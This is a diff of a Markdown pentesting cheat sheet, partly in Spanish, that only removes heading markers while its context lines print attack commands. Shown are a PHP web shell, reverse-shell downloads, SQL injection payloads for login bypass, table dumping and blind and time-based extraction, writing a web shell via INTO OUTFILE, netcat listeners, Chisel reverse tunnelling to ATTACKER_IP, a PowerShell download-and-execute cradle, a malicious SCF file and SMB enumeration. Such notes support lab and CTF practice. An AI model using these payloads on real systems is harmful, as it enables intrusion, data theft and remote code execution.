@@ -62,17 +62,17 @@ gobuster dir -e -u http://Domain-or-IP/ -w /usr/share/wordlists/dirbuster/direct
 ```
 ## Reverse Shell
 
-#### RCE PHP
+RCE PHP
 ```
 <?php system($_GET[cmd]);?>
 ```
 
-#### RCE .aspx
+RCE .aspx
 ```
 https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
 ```
 
-#### Shell PHP
+Shell PHP
 ```
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
@@ -140,28 +140,28 @@ RCE
 
 ## SQL Injection
 
-#### Database (BBDD, DB) enumeration (sustituir el numero correspondiente del último valor por 'database()' para saber el nombre de la BBDD)
+Database (BBDD, DB) enumeration (sustituir el numero correspondiente del último valor por 'database()' para saber el nombre de la BBDD)
 ```
 UNION SELECT 1,2,...
 ```
 
 ### In-band or Error Based
 
-#### Tables enumeration
+Tables enumeration
 ```
 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'nombre_BBDD'; - --
 ```
-#### Columns of table enumeration
+Columns of table enumeration
 ```
 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'nombre_tabla'; - --
 ```
-#### Table dumping
+Table dumping
 ```
 UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombre_tabla; - --
 ```
 ### Blind SQLI
 
-#### Login Bypass
+Login Bypass
 
 ```
 ' or 1=1 - --
@@ -181,31 +181,31 @@ user' or 1=1 LIMIT 1;#
 ```
 user' or 1=1 LIMIT 0,1;#
 ```
-#### Boolean Based (poner siempre por defecto 'false')
+### Boolean Based (poner siempre por defecto 'false')
 
-##### Database enumeration brute force attack(sin sustituir ninguno de los numeros)
+Database enumeration brute force attack(sin sustituir ninguno de los numeros)
 ```
 UNION SELECT 1,2,3 where database() like '%'; - --
 ```
-##### Tables enumeration
+Tables enumeration
 ```
 UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'BBDD' and table_name like '%';- --
 ```
-##### Columns enumeration
+Columns enumeration
 ```
 UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%'; - --
 ```
-##### Columns enumeration una vez encontrada una columna
+Columns enumeration una vez encontrada una columna
 ```
 UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='BBDD' and TABLE_NAME='nombre_tabla' and COLUMN_NAME like '%' and COLUMN_NAME !='nombre_tabla_encontrada'; - --
 ```
-##### Table dumping
+Table dumping
 ```
 UNION SELECT 1,2,3 from nombre_tabla where nombre_columna like '%' and nombre_columna like '%'; - --
 ```
-#### Time Based
+### Time Based
 
-##### Injección 
+Injección 
 ```
 UNION SELECT SLEEP(5),2,...; - --
 ```
@@ -219,39 +219,39 @@ select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
 
 ## Listeners
 
-##### Paquetes ICMP
+Paquetes ICMP
 ```
 tcpdump -i NETINTERFACE icmp -n
 ```
-##### Shell nc
+Shell nc
 ```
 nc -lvnp PORT
 ```
-##### Shell chetada
+Shell chetada
 ```
 rlwrap nc -lvnp PORT
 ```
 
 ## PostExplotacion
 
-##### Crear un HTTP server
+Crear un HTTP server
 
 ```
 python3 -m http.server PORT
 ```
-##### Permisos SUID
+Permisos SUID
 ```
 find / -user root -perm /4000
 ```
 
 ### Chisel
 
-##### Atacante
+Atacante
 ```
 ./chisel server --reverse -p ATACKER_PORT
 ```
 
-##### Víctima
+Víctima
 ```
 ./chisel client ATTACKER_IP:ATTACKER_PORT R:VICTIM_IP:VICTIM_PORT
 ```
@@ -282,14 +282,14 @@ export SHELL=bash
 
 ## Powershell
 
-### Descargar binarios
+Descargar binarios
 ```
 powershell IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/binario.binario')
 ```
 
 ## Hashes
 
-### Malicious SCF File
+Malicious SCF File
 ```
 [Shell]
 Command=2
@@ -306,11 +306,11 @@ Permission enumeration
 ```
 smbmap -H IP -u usuario -p password
 ```
-##### Listing with Null Session
+Listing with Null Session
 ```
 smbclient -L IP -N
 ```
-##### Enumeracion de directorios con usuario
+Enumeracion de directorios con usuario
 ```
 smbclient \\\\IP\\directorio -U 'username%password'
 ```
